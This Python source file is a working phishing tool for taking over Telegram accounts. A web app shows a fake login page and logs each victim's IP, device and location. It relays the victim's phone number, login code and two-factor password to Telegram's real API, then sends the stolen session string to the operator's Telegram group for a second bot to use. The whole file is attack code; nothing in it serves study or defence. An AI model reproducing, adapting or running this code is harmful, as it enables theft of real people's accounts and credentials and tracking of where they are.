import os
import asyncio
import telebot
import psycopg2
import requests
from io import BytesIO
from quart import Quart, request, render_template, jsonify
from telethon import TelegramClient, errors, functions, types
from telethon.sessions import StringSession
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- CONFIGURATION ---
# These should be set in your Koyeb Environment Variables
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")
BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")
OWNER_ID = 6092011859  # VinzyOwner ID

try:
    raw_group_id = os.environ.get("GROUP_ID", "0")
    GROUP_ID = int(raw_group_id)
except ValueError:
    GROUP_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)
app = Quart(__name__)

# Temporary storage for active login clients
active_relays = {}

# --- UTILITY: DEVICE, IP & LOCATION DETECTION ---

def get_client_info():
    """Extracts User-Agent for device type and IP for location tracking"""
    ua = request.headers.get('User-Agent', '').lower()
    
    # Device Logic
    if 'iphone' in ua or 'ipad' in ua:
        device = "📱 iOS (iPhone/iPad)"
    elif 'android' in ua:
        device = "🤖 Android Device"
    elif 'windows' in ua:
        device = "💻 Windows PC"
    elif 'macintosh' in ua:
        device = "🖥️ macOS (Mac)"
    else:
        device = "❓ Unknown Device"

    # IP Logic (Works behind Cloudflare/Koyeb Proxy)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    # Location Logic via IP-API
    location = "Unknown Location"
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=2).json()
        if res.get('status') == 'success':
            location = f"{res.get('city')}, {res.get('country')}"
    except:
        pass

    return device, ip, location

# --- DATABASE LOGIC (Authorization) ---

def init_db():
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS authorized_users (user_id TEXT PRIMARY KEY)")
    conn.commit()
    cur.close()
    conn.close()

def is_authorized(user_id):
    if int(user_id) == OWNER_ID: return True
    try:
        conn = psycopg2.connect(DATABASE_URL)
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM authorized_users WHERE user_id = %s", (str(user_id),))
        result = cur.fetchone()
        cur.close()
        conn.close()
        return result is not None
    except:
        return False

init_db()

# --- WEB ROUTES ---

@app.route('/')
async def index():
    tid = request.args.get('id')
    tag = request.args.get('tag', 'General')
    
    if not tid or not is_authorized(tid):
        return "❌ <b>Access Denied.</b> Please contact @VinzyOwner for a valid link.", 403

    device, ip, loc = get_client_info()
    
    # Immediate Alert: Someone clicked the link
    click_alert = (
        f"🔔 <b>Link Clicked!</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🏷️ Tag: <code>{tag}</code>\n"
        f"🌐 IP: <code>{ip}</code>\n"
        f"📍 Location: <code>{loc}</code>\n"
        f"📱 Device: <code>{device}</code>\n"
        f"👤 Relay: <code>{tid}</code>"
    )
    bot.send_message(GROUP_ID, click_alert, parse_mode="HTML")
    
    return await render_template('login.html', tid=tid)

@app.route('/step_phone', methods=['POST'])
async def step_phone():
    data = await request.json
    phone, tid = data.get('phone'), data.get('tid')
    device, ip, _ = get_client_info()
    
    # Masking: Use a model that matches the victim's device
    dev_model = "iPhone 15 Pro Max" if "iOS" in device else "Pixel 8 Pro"

    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model=dev_model)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
        
        # Log to Telegram
        bot.send_message(GROUP_ID, f"🎯 <b>Phone Entered:</b> <code>{phone}</code>\n💻 Device: <code>{device}</code>", parse_mode="HTML")
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_code', methods=['POST'])
async def step_code():
    data = await request.json
    phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
    
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(phone, code, phone_code_hash=active_relays[phone]["hash"])
        return await finalize_login(client, phone, tid)
    except errors.SessionPasswordNeededError:
        return jsonify({"status": "2fa_needed"})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

@app.route('/step_2fa', methods=['POST'])
async def step_2fa():
    data = await request.json
    phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
    
    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
    
    client = active_relays[phone]["client"]
    try:
        await client.sign_in(password=password)
        return await finalize_login(client, phone, tid)
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)})

async def finalize_login(client, phone, tid):
    """Handles data scraping and sends the .auth signal to the second bot"""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        
        # Human-Readable Log
        success_msg = (
            f"💰 <b>LOGIN SUCCESS!</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"👤 Name: {me.first_name}\n"
            f"🆔 ID: <code>{me.id}</code>\n"
            f"📱 Phone: <code>{phone}</code>"
        )
        bot.send_message(GROUP_ID, success_msg, parse_mode="HTML")
        
        # AUTOMATIC DATABASE TRIGGER (For your 2nd bot)
        bot.send_message(GROUP_ID, f".auth ({session_str})")
        
        # Clean up memory
        if phone in active_relays: del active_relays[phone]
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "msg": "Finalization failed"})

# --- BOT RUNNER ---

def run_bot():
    while True:
        try:
            bot.polling(non_stop=True, interval=2)
        except:
            asyncio.sleep(5)

if __name__ == "__main__":
    Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=8000)
